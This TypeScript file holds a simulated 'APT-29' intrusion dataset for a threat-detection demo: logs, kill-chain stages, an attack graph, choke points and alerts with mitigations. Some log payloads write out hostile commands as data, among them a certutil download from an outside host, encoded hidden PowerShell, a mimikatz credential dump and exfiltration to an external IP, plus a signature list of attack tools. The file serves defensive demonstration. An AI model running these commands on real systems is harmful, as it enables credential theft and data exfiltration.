import type {
  LogEntry,
  AlgorithmSpec,
  KillChainStage,
  AttackNode,
  AttackEdge,
  ChokePoint,
  MonitoringRecommendation,
  AlertItem
} from '../types/engine';

/**
 * Coherent Fictional Demonstration Dataset for the Threat-Intelligence Engine.
 *
 * Scenario: "APT-29 Lateral Intrusion & Exfiltration Scenario"
 * Progression flows through:
 * 1. Perimeter ingress & credential probing (HOST-001)
 * 2. Web shell payload exploitation (HOST-004)
 * 3. In-memory privilege escalation using obfuscated PowerShell (HOST-004)
 * 4. Critical lateral pivot through central jumpbox (HOST-014 - ARTICULATION POINT)
 * 5. Domain Controller impersonation (HOST-022)
 * 6. Target database staging & encryption (HOST-031 - TARGET SINK)
 * 7. Outbound exfiltration attempt via HTTPS egress proxy (HOST-040)
 */

export const DEMO_SCENARIO_NAME = 'APT-29 LATERAL INTRUSION & EXFILTRATION (SIMULATED)';

export const SAMPLE_LOGS: LogEntry[] = [
  {
    id: 'LOG-10821',
    time: '10:41:04',
    sourceIp: '194.26.29.11',
    targetHost: 'HOST-001',
    category: 'AUTH',
    payload: 'SSH-2.0-OpenSSH_8.2p1 auth request failure user=root',
    rawDetails: 'PAM_UNIX: authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=194.26.29.11',
    severity: 'LOW'
  },
  {
    id: 'LOG-10825',
    time: '10:41:49',
    sourceIp: '194.26.29.11',
    targetHost: 'HOST-001',
    category: 'AUTH',
    payload: 'SSH-2.0-OpenSSH_8.2p1 auth success user=svc_deploy',
    rawDetails: 'Accepted publickey for svc_deploy from 194.26.29.11 port 51242 ssh2',
    severity: 'MEDIUM'
  },
  {
    id: 'LOG-10834',
    time: '10:42:15',
    sourceIp: '10.0.1.10',
    targetHost: 'HOST-004',
    category: 'EXPLOIT',
    payload: 'POST /api/v1/ingest HTTP/1.1 payload="certutil -urlcache -split -f http://pkg.corp-cdn.net/stage2.bin"',
    rawDetails: 'Web application handler spawned child process cmd.exe calling binary download utility',
    severity: 'HIGH'
  },
  {
    id: 'LOG-10842',
    time: '10:42:58',
    sourceIp: '10.0.1.44',
    targetHost: 'HOST-004',
    category: 'PRIVILEGE',
    payload: 'powershell -enc JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQA... -nop -w hidden',
    rawDetails: 'Suspicious base64 obfuscated execution under SYSTEM context; Token privilege SeDebugPrivilege enabled',
    severity: 'CRITICAL'
  },
  {
    id: 'LOG-10855',
    time: '10:43:30',
    sourceIp: '10.0.1.44',
    targetHost: 'HOST-014',
    category: 'LATERAL',
    payload: 'SMB2 Tree Connect \\\\10.0.14.23\\IPC$ using acquired NTLM hash',
    rawDetails: 'Pass-the-hash authentication from compromised web host HOST-004 to central jumpbox HOST-014',
    severity: 'HIGH'
  },
  {
    id: 'LOG-10861',
    time: '10:43:52',
    sourceIp: '10.0.14.23',
    targetHost: 'HOST-014',
    category: 'PRIVILEGE',
    payload: 'mimikatz.exe sekurlsa::logonpasswords full memory scrape',
    rawDetails: 'LSASS process memory opened with PROCESS_VM_READ permissions by unauthorized process',
    severity: 'CRITICAL'
  },
  {
    id: 'LOG-10870',
    time: '10:44:12',
    sourceIp: '10.0.14.23',
    targetHost: 'HOST-022',
    category: 'LATERAL',
    payload: 'RDP connection initiated: mstsc /v:10.0.22.5:3389 with DomainAdmin ticket',
    rawDetails: 'Terminal Server Client connected using Kerberos Golden Ticket forged from KRBTGT key',
    severity: 'CRITICAL'
  },
  {
    id: 'LOG-10884',
    time: '10:44:50',
    sourceIp: '10.0.22.5',
    targetHost: 'HOST-031',
    category: 'LATERAL',
    payload: 'TDS protocol SQL Query: BACKUP DATABASE [threat_vault] TO DISK = "C:\\Temp\\vault.bak"',
    rawDetails: 'High-privilege database command issued by non-interactive service account session',
    severity: 'HIGH'
  },
  {
    id: 'LOG-10899',
    time: '10:45:22',
    sourceIp: '10.0.31.80',
    targetHost: 'HOST-040',
    category: 'EXFIL',
    payload: 'POST /v2/sync HTTP/1.1 Content-Length: 48920194 Host: 185.220.101.5:443',
    rawDetails: 'High-entropy encrypted payload dispatched through outbound proxy bypass rule',
    severity: 'CRITICAL'
  }
];

export const ALGORITHM_SPECS: AlgorithmSpec[] = [
  {
    id: 'KMP',
    name: 'Knuth-Morris-Pratt (KMP)',
    complexityTime: 'O(n + m)',
    complexitySpace: 'O(m)',
    theoreticalStatus: 'Planned for Phase 4 (Java 17 core)',
    description: 'Exact linear-time signature scanner using a precalculated Longest Proper Prefix which is also Suffix (LPS) array. Avoids text pointer backtracking.',
    preprocessingSummary: 'LPS array constructed in strictly O(m) time across the signature string.'
  },
  {
    id: 'Z_ALGORITHM',
    name: 'Z-Algorithm',
    complexityTime: 'O(n + m)',
    complexitySpace: 'O(n + m)',
    theoreticalStatus: 'Planned for Phase 4 (Java 17 core)',
    description: 'Constructs a Z-array over concatenated pattern and text (pattern + $ + text). Explicitly maintains rightmost match segment [L, R] to achieve linear matching.',
    preprocessingSummary: 'Linear single-pass construction of prefix-matching match box without redundant comparisons.'
  },
  {
    id: 'RABIN_KARP',
    name: 'Rabin-Karp (Polynomial Rolling Hash)',
    complexityTime: 'Average O(n + m), Worst O(nm)',
    complexitySpace: 'O(1)',
    theoreticalStatus: 'Planned for Phase 4 (Java 17 core)',
    description: 'Polynomial rolling hash over a sliding window with modular prime arithmetic. Character-by-character verification strictly prevents false positives from hash collisions.',
    preprocessingSummary: 'Computes initial pattern hash and base multiplier h = (d^(m-1)) % q in O(m) time.'
  }
];

export const SAMPLE_SIGNATURE_PATTERNS = [
  'powershell -enc',
  'certutil -urlcache',
  'mimikatz',
  'SSH-2.0-OpenSSH',
  'IPC$',
  'BACKUP DATABASE'
];

export const KILL_CHAIN_STAGES: KillChainStage[] = [
  {
    id: 'STAGE-1',
    stageNumber: 1,
    name: 'RECONNAISSANCE',
    summary: 'Perimeter scanning, brute-force SSH attempts, and service identification.',
    timestamp: '10:41:04',
    primaryHost: 'HOST-001 (Gateway)',
    evidence: 'External IP 194.26.29.11 probe; targeted svc_deploy credential misuse.',
    status: 'CORRELATED',
    indicators: ['SSH Port 22 Brute Force', 'Target Account: svc_deploy']
  },
  {
    id: 'STAGE-2',
    stageNumber: 2,
    name: 'EXPLOITATION',
    summary: 'Ingress delivery and download of secondary stage binary tooling.',
    timestamp: '10:42:15',
    primaryHost: 'HOST-004 (Web Ingress)',
    evidence: 'certutil -urlcache execution triggered by web application payload injection.',
    status: 'CONFIRMED',
    indicators: ['certutil download utility', 'Remote CDN: pkg.corp-cdn.net']
  },
  {
    id: 'STAGE-3',
    stageNumber: 3,
    name: 'PRIVILEGE ESCALATION',
    summary: 'In-memory token privilege acquisition and LSASS credential harvesting.',
    timestamp: '10:42:58',
    primaryHost: 'HOST-004 & HOST-014',
    evidence: 'Obfuscated PowerShell execution with SeDebugPrivilege; memory dumping via mimikatz.',
    status: 'CONFIRMED',
    indicators: ['Base64 Encoded PowerShell', 'LSASS Read Event', 'Dump: NTLM Hashes']
  },
  {
    id: 'STAGE-4',
    stageNumber: 4,
    name: 'LATERAL MOVEMENT',
    summary: 'Internal pivoting from perimeter DMZ through central jumpbox to core domain controller.',
    timestamp: '10:43:30',
    primaryHost: 'HOST-014 (Articulation Choke Point)',
    evidence: 'Pass-the-hash SMB tree connect to HOST-014, followed by Kerberos Golden Ticket RDP to HOST-022.',
    status: 'CONFIRMED',
    indicators: ['IPC$ SMB Transition', 'Forged Kerberos Ticket', 'Port 3389 RDP Session']
  },
  {
    id: 'STAGE-5',
    stageNumber: 5,
    name: 'EXFILTRATION',
    summary: 'Target database collection and compressed high-entropy egress transmission.',
    timestamp: '10:45:22',
    primaryHost: 'HOST-031 & HOST-040 (Egress)',
    evidence: 'Direct SQL backup extraction and HTTPS upload to remote external IP 185.220.101.5.',
    status: 'STAGED',
    indicators: ['threat_vault Backup Created', 'High-Entropy HTTPS Egress (48.9 MB)']
  }
];

export const ATTACK_NODES: AttackNode[] = [
  {
    id: 'HOST-001',
    label: 'HOST-001',
    ip: '10.0.1.1',
    type: 'entry',
    stage: 'Perimeter Gateway',
    x: 80,
    y: 200,
    connectionsCount: 2,
    reachablePathsCount: 8,
    status: 'ENTRY_POINT'
  },
  {
    id: 'HOST-002',
    label: 'HOST-002',
    ip: '10.0.1.15',
    type: 'compromised',
    stage: 'DNS Caching Service',
    x: 230,
    y: 110,
    connectionsCount: 2,
    reachablePathsCount: 3,
    status: 'ISOLATED'
  },
  {
    id: 'HOST-004',
    label: 'HOST-004',
    ip: '10.0.1.44',
    type: 'compromised',
    stage: 'Web Ingress Application',
    x: 250,
    y: 280,
    connectionsCount: 3,
    reachablePathsCount: 7,
    status: 'ACTIVE_PIVOT'
  },
  {
    id: 'HOST-014',
    label: 'HOST-014',
    ip: '10.0.14.23',
    type: 'pivot',
    stage: 'Central Jumpbox (Choke Point)',
    x: 470,
    y: 200,
    connectionsCount: 5,
    reachablePathsCount: 7,
    status: 'ACTIVE_PIVOT'
  },
  {
    id: 'HOST-020',
    label: 'HOST-020',
    ip: '10.0.14.88',
    type: 'compromised',
    stage: 'Internal File Storage',
    x: 470,
    y: 340,
    connectionsCount: 2,
    reachablePathsCount: 2,
    status: 'ISOLATED'
  },
  {
    id: 'HOST-022',
    label: 'HOST-022',
    ip: '10.0.22.5',
    type: 'pivot',
    stage: 'Domain Controller (Core Auth)',
    x: 690,
    y: 140,
    connectionsCount: 4,
    reachablePathsCount: 5,
    status: 'ACTIVE_PIVOT'
  },
  {
    id: 'HOST-031',
    label: 'HOST-031',
    ip: '10.0.31.80',
    type: 'target',
    stage: 'Threat Intelligence Vault (Target)',
    x: 710,
    y: 280,
    connectionsCount: 3,
    reachablePathsCount: 4,
    status: 'TARGET_SINK'
  },
  {
    id: 'HOST-040',
    label: 'HOST-040',
    ip: '10.0.40.10',
    type: 'exfil',
    stage: 'Outbound Proxy Gateway',
    x: 910,
    y: 200,
    connectionsCount: 2,
    reachablePathsCount: 3,
    status: 'TARGET_SINK'
  }
];

export const ATTACK_EDGES: AttackEdge[] = [
  {
    id: 'EDGE-1',
    source: 'HOST-001',
    target: 'HOST-002',
    protocol: 'SSH',
    bandwidthWeight: 10,
    isBottleneck: false,
    activityDescription: 'SSH probe from ingress gateway'
  },
  {
    id: 'EDGE-2',
    source: 'HOST-001',
    target: 'HOST-004',
    protocol: 'HTTPS',
    bandwidthWeight: 50,
    isBottleneck: false,
    activityDescription: 'Web traffic routing to application cluster'
  },
  {
    id: 'EDGE-3',
    source: 'HOST-002',
    target: 'HOST-014',
    protocol: 'SSH',
    bandwidthWeight: 15,
    isBottleneck: false,
    activityDescription: 'Secondary DNS administrative link'
  },
  {
    id: 'EDGE-4',
    source: 'HOST-004',
    target: 'HOST-014',
    protocol: 'SMB',
    bandwidthWeight: 80,
    isBottleneck: true,
    activityDescription: 'Primary lateral SMB transit into central management jumpbox'
  },
  {
    id: 'EDGE-5',
    source: 'HOST-014',
    target: 'HOST-020',
    protocol: 'SMB',
    bandwidthWeight: 20,
    isBottleneck: false,
    activityDescription: 'Probing internal file shares'
  },
  {
    id: 'EDGE-6',
    source: 'HOST-014',
    target: 'HOST-022',
    protocol: 'RDP',
    bandwidthWeight: 75,
    isBottleneck: true,
    activityDescription: 'Administrative RDP access to primary domain controller'
  },
  {
    id: 'EDGE-7',
    source: 'HOST-014',
    target: 'HOST-031',
    protocol: 'SMB',
    bandwidthWeight: 30,
    isBottleneck: false,
    activityDescription: 'Direct administrative SMB connection'
  },
  {
    id: 'EDGE-8',
    source: 'HOST-022',
    target: 'HOST-031',
    protocol: 'RDP',
    bandwidthWeight: 65,
    isBottleneck: false,
    activityDescription: 'Privileged database access from domain controller'
  },
  {
    id: 'EDGE-9',
    source: 'HOST-031',
    target: 'HOST-040',
    protocol: 'HTTPS',
    bandwidthWeight: 90,
    isBottleneck: true,
    activityDescription: 'Outbound exfiltration channel via proxy'
  }
];

export const CHOKE_POINTS: ChokePoint[] = [
  {
    hostId: 'HOST-014',
    ip: '10.0.14.23',
    role: 'Central Management Jumpbox',
    reachablePaths: 7,
    totalPaths: 8,
    articulationScore: 'CRITICAL (Tarjan Articulation Bridge)',
    minCutCapacity: 80,
    cutStatus: 'PRIMARY_BOTTLENECK'
  },
  {
    hostId: 'HOST-022',
    ip: '10.0.22.5',
    role: 'Core Domain Controller',
    reachablePaths: 5,
    totalPaths: 8,
    articulationScore: 'HIGH (Authentication Pivot)',
    minCutCapacity: 65,
    cutStatus: 'SECONDARY_PIVOT'
  },
  {
    hostId: 'HOST-004',
    ip: '10.0.1.44',
    role: 'Web Application Ingress',
    reachablePaths: 7,
    totalPaths: 8,
    articulationScore: 'HIGH (Ingress Aggregator)',
    minCutCapacity: 80,
    cutStatus: 'SECONDARY_PIVOT'
  },
  {
    hostId: 'HOST-040',
    ip: '10.0.40.10',
    role: 'Egress Proxy Gateway',
    reachablePaths: 4,
    totalPaths: 8,
    articulationScore: 'HIGH (Exfiltration Funnel)',
    minCutCapacity: 90,
    cutStatus: 'PRIMARY_BOTTLENECK'
  }
];

export const MONITORING_RECOMMENDATIONS: MonitoringRecommendation[] = [
  {
    rank: 1,
    sensorHost: 'HOST-014 (Central Jumpbox)',
    pathsCovered: 7,
    totalPaths: 8,
    coveragePercentage: 87.5,
    sensorType: 'HOST_EDR',
    rationale: 'Severing or monitoring HOST-014 inspects 87.5% of all lateral multi-hop trajectories toward internal data assets.'
  },
  {
    rank: 2,
    sensorHost: 'HOST-022 (Domain Controller)',
    pathsCovered: 5,
    totalPaths: 8,
    coveragePercentage: 62.5,
    sensorType: 'AUTH_WATCHER',
    rationale: 'Provides telemetry over all Kerberos and RDP ticket minting events for crown-jewel services.'
  },
  {
    rank: 3,
    sensorHost: 'HOST-040 (Egress Proxy)',
    pathsCovered: 4,
    totalPaths: 8,
    coveragePercentage: 50.0,
    sensorType: 'NETWORK_TAP',
    rationale: 'Monitors 100% of external egress stages before data crosses security perimeter.'
  }
];

export const ALERTS: AlertItem[] = [
  {
    id: 'ALT-9001',
    severity: 'CRITICAL',
    timestamp: '10:45:22',
    hostId: 'HOST-040',
    stage: 'EXFILTRATION',
    title: 'High-Volume Encrypted Egress to Uncategorized External IP',
    description: '48.9 MB dispatched via POST request to 185.220.101.5:443 bypassing regular CDN proxy cache.',
    mitigation: 'Apply egress choke policy on HOST-040 proxy table; terminate outbound TCP session.',
    status: 'UNRESOLVED'
  },
  {
    id: 'ALT-9002',
    severity: 'CRITICAL',
    timestamp: '10:44:12',
    hostId: 'HOST-022',
    stage: 'LATERAL MOVEMENT',
    title: 'Forged Kerberos Ticket (Golden Ticket) Authentication',
    description: 'Pass-the-ticket session established on Domain Controller originating from central pivot HOST-014.',
    mitigation: 'Rotate KRBTGT account password twice; isolate HOST-014 network segment.',
    status: 'INVESTIGATING'
  },
  {
    id: 'ALT-9003',
    severity: 'HIGH',
    timestamp: '10:43:52',
    hostId: 'HOST-014',
    stage: 'PRIVILEGE ESCALATION',
    title: 'LSASS Memory Scrape Signature Detected',
    description: 'Process access mask 0x1410 (PROCESS_VM_READ) opened against lsass.exe executable.',
    mitigation: 'Trigger EDR process freeze; invalidate cached domain credentials on HOST-014.',
    status: 'INVESTIGATING'
  },
  {
    id: 'ALT-9004',
    severity: 'HIGH',
    timestamp: '10:42:58',
    hostId: 'HOST-004',
    stage: 'EXPLOITATION',
    title: 'Obfuscated PowerShell Execution with Elevated Privileges',
    description: 'Encoded command script invoked with SeDebugPrivilege flag enabled in user space.',
    mitigation: 'Terminate parent web server worker pool; inspect file modifications in /api/v1.',
    status: 'UNRESOLVED'
  },
  {
    id: 'ALT-9005',
    severity: 'MEDIUM',
    timestamp: '10:41:49',
    hostId: 'HOST-001',
    stage: 'RECONNAISSANCE',
    title: 'Abnormal Service Account Ingress Authentication',
    description: 'svc_deploy logged in via SSH from unrecognized ASN origin.',
    mitigation: 'Review SSH authorized_keys file; enforce MFA on external ingress bastion.',
    status: 'MITIGATED'
  },
  {
    id: 'ALT-9006',
    severity: 'LOW',
    timestamp: '10:41:04',
    hostId: 'HOST-001',
    stage: 'RECONNAISSANCE',
    title: 'Repetitive SSH Authentication Failures',
    description: '14 sequential failed password attempts targeting root account.',
    mitigation: 'IP 194.26.29.11 auto-blacklisted on firewall boundary.',
    status: 'MITIGATED'
  }
];
